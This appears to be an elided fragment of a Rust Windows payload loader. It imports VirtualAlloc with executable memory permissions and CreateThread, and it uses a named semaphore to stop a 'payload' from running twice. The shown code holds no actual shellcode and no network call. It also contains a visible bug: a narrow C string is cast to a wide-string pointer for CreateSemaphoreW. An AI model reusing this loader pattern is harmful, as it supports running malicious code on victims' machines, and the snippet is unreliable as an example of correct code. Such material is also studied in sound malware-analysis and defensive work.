...
use winapi::{shared::winerror::ERROR_ALREADY_EXISTS, um::{errhandlingapi::GetLastError, memoryapi::VirtualAlloc, processthreadsapi::CreateThread, synchapi::{CreateSemaphoreW, WaitForSingleObject}, winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}}};
...
fn main() {
    ...
    unsafe {
        ...
        let h_semaphore = CreateSemaphoreW(null_mut(), 10, 10, CStr::from_bytes_with_nul(b"my_semaphore\0").unwrap().as_ptr() as *const u16);

        if h_semaphore.is_null() {
            println!("[-] CreateSemaphoreW failed with error: {}", GetLastError());
            return;
        }

        if !h_semaphore.is_null() && GetLastError() == ERROR_ALREADY_EXISTS {
            println!("[+] Payload is already running.");
            return;
        }
